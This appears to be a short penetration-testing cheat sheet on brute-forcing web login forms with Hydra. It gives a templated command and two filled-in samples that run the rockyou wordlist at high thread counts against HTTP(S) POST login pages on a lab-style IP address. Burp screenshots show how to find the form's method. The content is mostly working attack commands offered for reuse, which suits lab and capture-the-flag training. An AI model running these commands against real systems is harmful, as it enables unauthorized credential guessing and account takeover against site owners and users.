## Web content
#### Command
- `hydra -l {User_List} -P {Pass_List} {IP_Address} https-post-form "{Login_Path}:{password_name}=^PASS^&proc_login=true:{Failed_contents}" -t 64 -V`  
#### sample1
- `hydra -l none -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password" -t 64 -V`
#### Search
- Burp
  - Target
    - Method:POST
      ![image](https://github.com/user-attachments/assets/9556b51a-e9a5-4cd8-b45b-a00203404bf6)
#### sample2
- `hydra -V -f -l admin -P ./rockyou.txt 10.10.10.43 http-post-form '/department/login.php:username=^USER^&password=^PASS^&Login=Login:Invalid Password!'`
- Burp
  - Target
    - Method:POST
      ![image](https://github.com/user-attachments/assets/fc3279cf-4b6a-4a32-83cb-666080a76aef)

